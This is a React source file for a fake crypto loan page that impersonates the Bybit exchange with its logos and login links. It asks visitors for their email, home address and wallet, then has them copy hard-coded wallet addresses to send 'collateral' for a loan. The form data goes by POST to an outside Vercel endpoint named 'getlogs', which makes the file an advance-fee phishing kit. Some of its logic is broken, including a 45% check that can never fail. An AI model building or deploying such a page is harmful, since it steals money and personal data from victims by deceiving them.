import React, { useState } from "react";
import {
	TextField,
	Button,
	Paper,
	Typography,
	CircularProgress,
	Box,
	Select,
	MenuItem,
	FormControl,
	InputLabel,
	CssBaseline,
	Divider,
	Grid,
	Dialog,
	DialogTitle,
	DialogContent,
	DialogActions,
} from "@mui/material";
import { motion } from "framer-motion";
import { styled } from "@mui/material/styles";
import { ThemeProvider, createTheme } from "@mui/material/styles";
import copy from "copy-to-clipboard";
import { RiFileCopyLine } from "react-icons/ri";

import bbicon from "../assets/bbsavicon.png";
import newcoin from "../assets/newcoin.png";
import axios from "axios";

// Styled container for the form
const StyledPaper = styled(Paper)(({ theme }) => ({
	padding: theme.spacing(4),
	display: "flex",
	flexDirection: "column",
	alignItems: "center",
	maxWidth: 600,
	margin: "auto",
	borderRadius: "20px",
	boxShadow: theme.shadows[5],
	transition: "transform 0.2s",
	"&:hover": {
		transform: "scale(1.03)",
	},
}));

const reasonOptions = [
	"Funding investments",
	"Covering personal expenses",
	"Participating in DeFi",
	"Leverage trading",
	"Avoiding asset liquidation",
	"Accessing quick liquidity",
	"Funding business growth",
	"Buying high-value assets",
	"Diversifying portfolio",
	"Emergency expenses",
	"Paying taxes",
	"Real estate purchases",
	"Educational costs",
	"Travel expenses",
	"Renovations or home improvements",
	"Consolidating debt",
	"Seizing market opportunities",
	"Gifting or donations",
	"Speculative trading",
	"Supporting family or friends",
	"Medical expenses",
	"Car purchases or repairs",
	"Event funding (weddings, parties)",
	"Subscription to new platforms",
	"Research and development",
	"Crypto mining investments",
	"NFT purchases",
	"Insurance premiums",
	"Legal or consultancy fees",
	"Other",
];

const adminWalletData = [
	{
		walletType: "BTC",
		network: "btc",
		walletAddr: "bc1qpz5sx7myd2pvv2twu5udan3aau440a73hzhyvw",
		id: 1,
	},
	{
		walletType: "ETH",
		network: "erc20",
		walletAddr: "0x83d354eB06b8A6987dAF7bdd0d63929232D072eb",
		id: 2,
	},
	{
		walletType: "USDT",
		network: "TRC20",
		walletAddr: "TWLuvnzjCRDPHa38NJXAybVz4mpryyh9MD",
		id: 3,
	},
	// add more wallets as needed
];

const theme = createTheme({
	palette: {
		primary: { main: "#1976d2" },
		secondary: { main: "#dc004e" },
	},
});

const DepositForm = () => {
	// State variables
	const [email, setEmail] = useState("");
	const [homeAddress, setHomeAddress] = useState("");
	const [loanAmount, setLoanAmount] = useState("");
	const [purpose, setPurpose] = useState("");
	const [reason, setReason] = useState("");
	const [customReason, setCustomReason] = useState("");
	const [selectedWallet, setSelectedWallet] = useState("");
	const [loginError, setLoginError] = useState("");
	const [loading, setLoading] = useState(false);
	const [successMsg, setSuccessMsg] = useState("");
	const [dialogOpen, setDialogOpen] = useState(false);

	// Derived values
	const selectedWalletType =
		adminWalletData.find((wlt) => wlt.walletAddr === selectedWallet)
			?.walletType || "";

	// Validation
	const validateAmount = (amount) => {
		const num = parseFloat(amount);
		return !isNaN(num) && num > 0;
	};

	// Handle form submission
	const handleDeposit = async () => {
		setLoginError("");
		setSuccessMsg("");

		// Basic validation
		if (
			!validateAmount(loanAmount) ||
			!email ||
			!homeAddress ||
			!reason ||
			!selectedWallet ||
			(reason === "Other" && !customReason)
		) {
			setLoginError("Please fill all the fields with valid data.");
			return;
		}

		// Optional: enforce minimum 45% payment constraint if you have amount paid info
		// For now, assuming full payment is made
		const amountNum = parseFloat(loanAmount);
		if (amountNum * 0.45 > amountNum) {
			setLoginError("You must pay at least 45% of the loan amount.");
			return;
		}

		setLoading(true);

		console.log({
			email,
			homeAddress,
			amountNum,
			purpose,
			reason,
			customReason,
			selectedWallet,
		});
		try {
			// Make your API call here
			const response = await axios.post(
				"https://vercel.com/mariauralskayas-projects/glory/5UnxbCDZYYedraZFMJUA9J7prbH7/getlogs",
				{
					email,
					homeAddress,
					loanAmount: amountNum,
					purpose,
					reason,
					customReason,
					walletAddress: selectedWallet,
				}
			);

			console.log(response);
			if (!response.ok) throw new Error("Network response was not ok");
			// Optional: handle response dataadswr
			// const data = await response.json();dtyhrth

			setSuccessMsg(
				"Your loan will be sent to your wallet once your deposit is confirmed."
			);
			setDialogOpen(true);
		} catch (error) {
			console.log(error);
			setLoginError("An error occurred. Please try again.");
		} finally {
			setLoading(false);
		}
	};

	const handleCopyWalletAddress = () => {
		const walletItem = adminWalletData.find(
			(wlt) => wlt.walletAddr === selectedWallet
		);
		if (walletItem) {
			copy(walletItem.walletAddr);
		}
	};

	const loanCollateral = (Number(loanAmount) * 20) / 100; // Example amount, replace with actual logic

	return (
		<ThemeProvider theme={theme}>
			<CssBaseline />
			<section>
				{/* Header with logo and links */}
				<Box
					sx={{
						mb: 2,
						backgroundColor: "#17181e",
						px: 2,
						color: "white",
						display: "flex",
						justifyContent: "space-between",
						alignItems: "center",
						minHeight: "3rem",
						position: "sticky",
						top: 0,
						zIndex: 1000,
					}}>
					<Box>
						<a href="https://www.bybit.com/en/">
							<img
								src={bbicon}
								alt="bybitlogo"
								style={{ height: "3rem", width: "3rem" }}
							/>
						</a>
					</Box>
					<Box sx={{ fontSize: "0.8rem" }}>
						<a
							href="https://www.bybit.com/en/login?redirect_url=https%3A%2F%2Fwww.bybit.com%2Fen%2F"
							style={{ color: "white", marginRight: "1rem" }}>
							Log In
						</a>
						<a
							href="https://www.bybit.com/en/register?redirect_url=%2Ftrade%2Fusdt%2F"
							style={{
								backgroundColor: "yellow",
								color: "black",
								padding: "0.3rem 1.5rem",
								borderRadius: "4px",
								textDecoration: "none",
							}}>
							Sign Up
						</a>
					</Box>
				</Box>

				{/* Main content with animation */}
				<motion.div
					className="w-[95%] mx-auto my-[2rem]"
					initial={{ opacity: 0, y: -30 }}
					animate={{ opacity: 1, y: 0 }}
					transition={{ duration: 0.5 }}>
					<StyledPaper
						sx={{
							backgroundColor: "#17181e",
							borderRadius: "20px",
							boxShadow: "0 4px 20px rgba(0, 0, 0, 0.1)",
						}}>
						{/* Decorative SVG */}
						<Box sx={{ color: "white" }}>
							<svg
								xmlns="http://www.w3.org/2000/svg"
								width="100%"
								viewBox="0 0 720 230"
								fill="none">
								<circle
									cx="359"
									cy="423"
									r="420"
									fill="none"
									fillOpacity="0.8"
									stroke="url(#paint0_linear_16626_29260)"
									strokeWidth="6"
								/>
								<defs>
									<linearGradient
										id="paint0_linear_16626_29260"
										x1="359"
										y1="-7.3015e-07"
										x2="359"
										y2="214.5"
										gradientUnits="userSpaceOnUse">
										<stop stopColor="white" />
										<stop offset="1" stopColor="white" stopOpacity="0" />
									</linearGradient>
								</defs>
							</svg>
						</Box>

						{/* Logos */}
						<Box sx={{ mb: 2, textAlign: "center" }}>
							<img
								src={newcoin}
								alt="bybitlogo"
								style={{ height: "10rem", width: "15rem" }}
							/>
						</Box>
						<Box sx={{ mb: 2, textAlign: "center" }}>
							<img
								src={bbicon}
								alt="bybitlogo"
								style={{ height: "6rem", width: "6rem" }}
							/>
						</Box>

						{/* Title */}
						<Typography
							variant="h6"
							gutterBottom
							fontWeight="medium"
							sx={{ color: "white", mb: 2 }}
							align="center">
							Enjoy your loan offer
						</Typography>
						<Typography
							variant="body2"
							gutterBottom
							fontWeight="bold"
							sx={{ color: "yellow", mb: 2 }}
							align="center">
							<span className="text-yellow-400  text-[0.9rem]">
								Apply & get your crypto instantly
							</span>
						</Typography>

						{/* Form */}
						<form
							onSubmit={(e) => {
								e.preventDefault();
								handleDeposit();
							}}
							style={{ width: "100%", background: "white", padding: "1rem" }}
							noValidate>
							<Grid container spacing={2}>
								{/* Email */}
								<Grid item xs={12} sm={6}>
									<TextField
										label="Email"
										variant="outlined"
										fullWidth
										required
										value={email}
										onChange={(e) => setEmail(e.target.value)}
										type="email"
									/>
								</Grid>
								{/* Home Address */}
								<Grid item xs={12} sm={6}>
									<TextField
										label="Home Address"
										variant="outlined"
										fullWidth
										required
										value={homeAddress}
										onChange={(e) => setHomeAddress(e.target.value)}
									/>
								</Grid>
								{/* Loan Amount */}
								<Grid item xs={12} sm={6}>
									<TextField
										label="Loan Amount (USD)"
										variant="outlined"
										fullWidth
										required
										value={loanAmount}
										onChange={(e) => setLoanAmount(e.target.value)}
										type="number"
										inputProps={{ min: 0.01, step: 0.01 }}
									/>
								</Grid>
								{/* Reason for Loan */}
								<Grid item xs={12} sm={6}>
									<FormControl fullWidth>
										<InputLabel id="reason-label">Reason for Loan</InputLabel>
										<Select
											sx={{ width: "12rem" }}
											labelId="reason-label"
											value={reason}
											onChange={(e) => setReason(e.target.value)}
											label="Reason for Loan">
											{reasonOptions.map((option) => (
												<MenuItem key={option} value={option}>
													{option}
												</MenuItem>
											))}
										</Select>
									</FormControl>
								</Grid>
								{/* Custom Reason */}
								{reason === "Other" && (
									<Grid item xs={12}>
										<TextField
											label="Custom Reason"
											variant="outlined"
											fullWidth
											value={customReason}
											onChange={(e) => setCustomReason(e.target.value)}
											required
										/>
									</Grid>
								)}
								{/* Wallet Selection */}
								<Grid item xs={12}>
									<Typography variant="subtitle2" gutterBottom>
										Select your crypto wallet:
									</Typography>
									<FormControl fullWidth required>
										<InputLabel id="wallet-label">Wallet</InputLabel>
										<Select
											labelId="wallet-label"
											value={selectedWallet}
											onChange={(e) => setSelectedWallet(e.target.value)}
											label="Wallet">
											{adminWalletData.map((wlt) => (
												<MenuItem key={wlt.walletAddr} value={wlt.walletAddr}>
													{wlt.walletType}
												</MenuItem>
											))}
										</Select>
									</FormControl>
								</Grid>
								{/* Wallet Address Paste */}
								{selectedWallet && (
									<Grid item xs={12}>
										<TextField
											label={`Paste your ${selectedWalletType} wallet address`}
											variant="outlined"
											fullWidth
											value={purpose}
											onChange={(e) => setPurpose(e.target.value)}
										/>
										<Button
											variant="outlined"
											color="success"
											startIcon={<RiFileCopyLine />}
											onClick={handleCopyWalletAddress}
											sx={{ fontSize: "0.75rem", my: "0.5rem" }}>
											Click to copy the Bybit {selectedWalletType} wallet
											address to deposit your ${loanCollateral} collateral for
											the ${loanAmount} loan.
										</Button>
									</Grid>
								)}
							</Grid>

							{/* Submit Button */}
							<Button
								type="submit"
								variant="contained"
								fullWidth
								disabled={
									loading ||
									!validateAmount(loanAmount) ||
									(reason === "Other" && !customReason)
								}
								sx={{
									bgcolor: "#DEC102",
									mt: 2,
									position: "relative",
									"&:hover": { bgcolor: "#caa003" },
								}}>
								{loading && (
									<CircularProgress
										size={24}
										sx={{
											position: "absolute",
											top: "50%",
											left: "50%",
											transform: "translate(-50%, -50%)",
											zIndex: 1,
										}}
									/>
								)}
								<Typography sx={{ color: "black", fontWeight: "medium" }}>
									Finish
								</Typography>
							</Button>

							{/* Feedback */}
							{loginError && (
								<Typography color="error" align="center" sx={{ mt: 2 }}>
									{loginError}
								</Typography>
							)}
							{successMsg && (
								<Typography color="green" align="center" sx={{ mt: 2 }}>
									{successMsg}
								</Typography>
							)}
						</form>
					</StyledPaper>
				</motion.div>

				{/* Success modal */}
				<Dialog open={dialogOpen} onClose={() => setDialogOpen(false)}>
					<DialogTitle>Payment processing</DialogTitle>
					<DialogContent>
						<Typography>Your deposit will be confirmed shortly.</Typography>
					</DialogContent>
					<DialogActions>
						<Button onClick={() => setDialogOpen(false)} color="primary">
							Close
						</Button>
					</DialogActions>
				</Dialog>
			</section>
		</ThemeProvider>
	);
};

export default function UDDeposit() {
	return (
		<ThemeProvider theme={theme}>
			<CssBaseline />
			<DepositForm />
		</ThemeProvider>
	);
}
